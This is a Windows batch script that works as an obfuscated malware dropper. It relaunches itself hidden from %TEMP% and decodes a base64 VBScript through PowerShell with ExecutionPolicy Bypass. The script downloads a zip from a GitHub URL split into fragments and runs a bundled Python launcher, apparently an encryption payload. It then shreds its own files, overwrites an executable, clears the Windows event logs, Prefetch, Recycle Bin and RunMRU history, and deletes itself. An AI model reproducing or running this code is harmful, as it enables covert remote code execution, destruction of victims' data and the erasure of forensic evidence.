@echo off
setlocal enabledelayedexpansion

if not "%1"=="worker" (
    set "tempbat=%TEMP%\~w!RANDOM!!RANDOM!.bat"
    copy /y "%~f0" "!tempbat!" >nul 2>&1
    if exist "!tempbat!" (
        start /b cmd /c call "!tempbat!" worker
        timeout /t 2 /nobreak >nul
        del /f /q "%~f0" >nul 2>&1
    )
    exit /b
)

set "vbsfile=%TEMP%\~init!RANDOM!.vbs"

powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
"$b64 = 'T24gRXJyb3IgUmVzdW1lIE5leHQKUmFuZG9taXplClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikKU2V0IHNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKc2NyaXB0UGF0aCA9IFdTY3JpcHQuU2NyaXB0RnVsbE5hbWUKc2NyaXB0TmFtZSA9IGZzby5HZXRGaWxlTmFtZShzY3JpcHRQYXRoKQpzY3JpcHREaXIgPSBmc28uR2V0UGFyZW50Rm9sZGVyTmFtZShzY3JpcHRQYXRoKQp0ZW1wQmFzZSA9IHNoZWxsLkV4cGFuZEVudmlyb25tZW50U3RyaW5ncygiJVRFTVAlIikKSWYgSW5TdHIoTENhc2Uoc2NyaXB0UGF0aCksIExDYXNlKHRlbXBCYXNlKSkgPiAwIEFuZCBMQ2FzZShzY3JpcHROYW1lKSA9ICJjb3JlLnZicyIgVGhlbgpleGVQYXRoID0gIiIKRm9yIEVhY2ggZiBJbiBmc28uR2V0Rm9sZGVyKHNjcmlwdERpcikuRmlsZXMKSWYgTENhc2UoUmlnaHQoZi5OYW1lLCA0KSkgPSAiLmV4ZSIgVGhlbgpleGVQYXRoID0gZi5QYXRoCkV4aXQgRm9yCkVuZCBJZgpOZXh0CnUxID0gImh0dHBzOi8vIgp1MiA9ICJnaXRodWIuIgp1MyA9ICJjb20vIgp1NCA9ICJicmF5YW4iCnU1ID0gImpob2FuY2UiCnU2ID0gIjItY29sbGFiLyIKdTcgPSAiZW5jcmlwIgp1OCA9ICJ0YWRvLyIKdTkgPSAiYXJjaGl2ZS8iCnUxMCA9ICJyZWZzL2hlYWRzLyIKdTExID0gIm1haW4uemlwIgpyZXBvVVJMID0gdTEgJiB1MiAmIHUzICYgdTQgJiB1NSAmIHU2ICYgdTcgJiB1OCAmIHU5ICYgdTEwICYgdTExCnpEID0gc2NyaXB0RGlyICYgIlwiOiB6TiA9ICIiCkZvciBpID0gMSBUbyA4OiB6TiA9IHpOICYgQ2hyKEludChSbmQgKiAyNikgKyA5Nyk6IE5leHQKemlwUGF0aCA9IHpEICYgek4gJiAiLnRtcCIKZUQgPSBzY3JpcHREaXIgJiAiXCI6IGVOID0gIiIKRm9yIGkgPSAxIFRvIDc6IGVOID0gZU4gJiBDaHIoSW50KFJuZCAqIDI2KSArIDk3KTogTmV4dApleHRyYWN0UGF0aCA9IGVEICZ6Tgpwc0Rvd25sb2FkID0gInBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiIiIgJiBfCiJbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyOyAiICYgXwoiJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsgIiAmIF8KIiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZSc7ICIgJiBfCiJ0cnkgeyAiICYgXwoiICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJyIgJiByZXBvVVJMICYgIicgLU91dEZpbGUgJyIgJiB6aXBQYXRoICYgIicgLVVzZUJhc2ljUGFyc2luZyAtVGltZW91dFNlYyAxMjA7ICIgJiBfCiIgICAgRXhwYW5kLUFyY2hpdmUgLVBhdGggJyIgJiB6aXBQYXRoICYgIicgLURlc3RpbmF0aW9uUGF0aCAnIiAmIGV4dHJhY3RQYXRoICYgIicgLUZvcmNlICIgJiBfCiJ9IGNhdGNoIHsgZXhpdCAxIH0gIiAmIF8KIiIiIgpzaGVsbC5SdW4gcHNEb3dubG9hZCwgMCwgVHJ1ZQpXU2NyaXB0LlNsZWVwIDgwMDAKSWYgTm90IGZzby5GaWxlRXhpc3RzKHppcFBhdGgpIFRoZW4KV1NjcmlwdC5RdWl0CkVuZCBJZgpXU2NyaXB0LlNsZWVwIDIwMDAKcmVwb1BhdGggPSAiIgpsYXVuY2hlclBhdGggPSAiIgpweXRob25QYXRoID0gIiIKSWYgZnNvLkZvbGRlckV4aXN0cyhleHRyYWN0UGF0aCkgVGhlbgpGb3IgRWFjaCBzdWJmb2xkZXIgSW4gZnNvLkdldEZvbGRlcihleHRyYWN0UGF0aCkuU3ViRm9sZGVycwpJZiBMQ2FzZShzdWJmb2xkZXIuTmFtZSkgPSAiZW5jcmlwdGFkby1tYWluIiBUaGVuCnJlcG9QYXRoID0gc3ViZm9sZGVyLlBhdGgKbGF1bmNoZXJQYXRoID0gcmVwb1BhdGggJiAiXGxhdW5jaGVyLnB5IgpweXRob25QYXRoID0gcmVwb1BhdGggJiAiXHB5dGhvbl9wb3J0YWJsZVxweXRob24uZXhlIgpFeGl0IEZvcgpFbmQgSWYKTmV4dApFbmQgSWYKSWYgcmVwb1BhdGggPD4gIiIgQW5kIGZzby5GaWxlRXhpc3RzKGxhdW5jaGVyUGF0aCkgQW5kIGZzby5GaWxlRXhpc3RzKHB5dGhvblBhdGgpIFRoZW4Kc2hlbGwuQ3VycmVudERpcmVjdG9yeSA9IHJlcG9QYXRoCmNtZExhdW5jaCA9ICIiIiIgJiBweXRob25QYXRoICYgIiIiICIiIiAmIGxhdW5jaGVyUGF0aCAmICIiIgpzaGVsbC5SdW4gY21kTGF1bmNoLCAwLCBGYWxzZQpXU2NyaXB0LlNsZWVwIDEwMDAwCkVuZCBJZgpJZiBleGVQYXRoIDw+ICIiIEFuZCBmc28uRmlsZUV4aXN0cyhleGVQYXRoKSBUaGVuCkZvciBpID0gMSBUbyA1ClNldCBmdyA9IGZzby5PcGVuVGV4dEZpbGUoZXhlUGF0aCwgMikKRm9yIGogPSAxIFRvIDIwMDAKZncuV3JpdGVMaW5lIFN0cmluZygxMjgsIENocihJbnQoUm5kICogMjU2KSkpCk5leHQKZncuQ2xvc2UKV1NjcmlwdC5TbGVlcCAzMDAKTmV4dApmcy5EZWxldGVGaWxlIGV4ZVBhdGgsIFRydWUKRW5kIElmCldTY3JpcHQuU2xlZXAgMzAwMApJZiBmc28uRmlsZUV4aXN0cyh6aXBQYXRoKSBUaGVuCnppcFNpemUgPSBmc28uR2V0RmlsZSh6aXBQYXRoKS5TaXplCklmIHppcFNpemUgPiAwIEFuZCB6aXBTaXplIDwgMjAwMDAwMDAwIFRoZW4KRm9yIHBhc3MgPSAxIFRvIDUKcHNTaHJlZCA9ICJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Ob1Byb2ZpbGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIiIiICYgXwoiJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsgIiAmIF8KIiRieXRlcyA9IE5ldy1PYmplY3QgYnl0ZVtdICIgJiB6aXBTaXplICYgIjsgIiAmIF8KIihOZXctT2JqZWN0IFJhbmRvbSkuTmV4dEJ5dGVzKCRieXRlcyk7ICIgJiBfCiJbSU8uRmlsZV06OldyaXRlQWxsQnl0ZXMoJyIgJiB6aXBQYXRoICYgIicsICRieXRlcykgIiAmIF8KIiIiIgpzaGVsbC5SdW4gcHNTaHJlZCwgMCwgVHJ1ZQpXU2NyaXB0LlNsZWVwIDUwMApOZXh0CkVuZCBJZgpmcy5EZWxldGVGaWxlIHppcFBhdGgsIFRydWUKRW5kIElmCklmIGZzby5Gb2xkZXJFeGlzdHMoZXh0cmFjdFBhdGgpIFRoZW4KRm9yIHBhc3MgPSAxIFRvIDMKRm9yIEVhY2ggZiBJbiBmc28uR2V0Rm9sZGVyKGV4dHJhY3RQYXRoKS5GaWxlcwpmU2l6ZSA9IGYuU2l6ZQpJZiBmU2l6ZSA+IDAgQW5kIGZTaXplIDwgNTAwMDAwMDAgVGhlbgpwc1NocmVkRiA9ICJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Ob1Byb2ZpbGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIiIiICYgXwoiJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJzsgIiAmIF8KIiRiID0gTmV3LU9iamVjdCBieXRlW10gIiAmIGZTaXplICYgIjsgIiAmIF8KIihOZXctT2JqZWN0IFJhbmRvbSkuTmV4dEJ5dGVzKCRiKTsgIiAmIF8KIltJTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygnIiAmIGYuUGF0aCAmICInLCAkYikgIiAmIF8KIiIiIgpzaGVsbC5SdW4gcHNTaHJlZEYsIDAsIFRydWUKV1NjcmlwdC5TbGVlcCAyMDAKRW5kIElmCk5leHQKV1NjcmlwdC5TbGVlcCA1MDAKO2V4dApmcy5EZWxldGVGb2xkZXIgZXh0cmFjdFBhdGgsIFRydWUKRW5kIElmCnBzQ2xlYXIgPSAicG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtTm9Qcm9maWxlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kICIiIiAmIF8KIiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZSc7ICIgJiBfCiJSZW1vdmUtSXRlbSAnQzpcV2luZG93c1xQcmVmZXRjaFwqLnBmJyAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7ICIgJiBfCiJDbGVhci1SZWN5Y2xlQmluIC1Gb3JjZSAtQ29uZmlybTokZmFsc2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7ICIgJiBfCiJ3ZXZ0dXRpbCBjbCBBcHBsaWNhdGlvbiAyPiRudWxsOyAiICYgXwoid2V2dHV0aWwgY2wgU3lzdGVtIDI+JG51bGw7ICIgJiBfCiJ3ZXZ0dXRpbCBjbCBTZWN1cml0eSAyPiRudWxsOyAiICYgXwoiUmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcUnVuTVJVJyAtTmFtZSAnKicgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlICIgJiBfCiIiIiIKc2hlbGwuUnVuIHBzQ2xlYXIsIDAsIFRydWUKV1NjcmlwdC5TbGVlcCAzMDAwCmNsZWFudXBCYXQgPSBzY3JpcHREaXIgJiAiXGNsZWFudXAuYmF0IgpTZXQgZmMgPSBmc28uQ3JlYXRlVGV4dEZpbGUoY2xlYW51cEJhdCwgVHJ1ZSkKZmMuV3JpdGVMaW5lICJAZWNobyBvZmYiCmZjLldyaXRlTGluZSAidGltZW91dCAvdCAxMCAvbm9icmVhayA+bnVsIgpmYy5Xcml0ZUxpbmUgInRhc2traWxsIC9mIC9pbSB3c2NyaXB0LmV4ZSA+bnVsIDI+JjEiCmZjLldyaXRlTGluZSAidGFza2tpbGwgL2YgL2ltIHB5dGhvbi5leGUgPm51bCAyPiYxIgpmYy5Xcml0ZUxpbmUgImRlbCAvZiAvcSAiIiIgJiBzY3JpcHRQYXRoICYgIiIiID5udWwgMj4mMSIKZmMuV3JpdGVMaW5lICJjZCAvZCAlVEVNUCUiCmZjLldyaXRlTGluZSAicm1kaXIgL3MgL3EgIiIiICYgc2NyaXB0RGlyICYgIiIiID5udWwgMj4mMSIKZmMuV3JpdGVMaW5lICIoZ290bykgMj5udWwgJiBkZWwgL2YgL3EgIiIlfmYwIiIgJiBleGl0IgpmYy5DbG9zZQpzaGVsbC5SdW4gImNtZC5leGUgL2MgIiIiICYgY2xlYW51cEJhdCAmICIiIiIsIDAsIEZhbHNlCldTY3JpcHQuUXVpdApFbHNlCnRlbXBJRCA9ICJzeXNfIiAmIEludChSbmQgKiA5OTk5OTkgKyAxMDAwMDApCnRlbXBXb3JrID0gdGVtcEJhc2UgJiAiXCIgJiB0ZW1wSUQKZnNvLkNyZWF0ZUZvbGRlciB0ZW1wV29yawp2YnNUZW1wID0gdGVtcFdvcmsgJiAiXGNvcmUudmJzIgpmcy5Db3B5RmlsZSBzY3JpcHRQYXRoLCB2YnNUZW1wLCBUcnVlCnNoZWxsLlJ1biAid3NjcmlwdC5leGUgIiIiICYgdmJzVGVtcCAmICIiIiAvL0IgLy9Ob2xvZ28iLCAwLCBGYWxzZQpXU2NyaXB0LlNsZWVwIDIwMDAKZnNvLkRlbGV0ZUZpbGUgc2NyaXB0UGF0aCwgVHJ1ZQpXU2NyaXB0LlF1aXQKRW5kIElm'; ^
$bytes = [Convert]::FromBase64String($b64); ^
[IO.File]::WriteAllBytes('%vbsfile%', $bytes)"

timeout /t 2 /nobreak >nul

if exist "%vbsfile%" (
    start /b wscript.exe "%vbsfile%" //B //Nologo
    timeout /t 3 /nobreak >nul
)

del /f /q "%~f0" >nul 2>&1
exit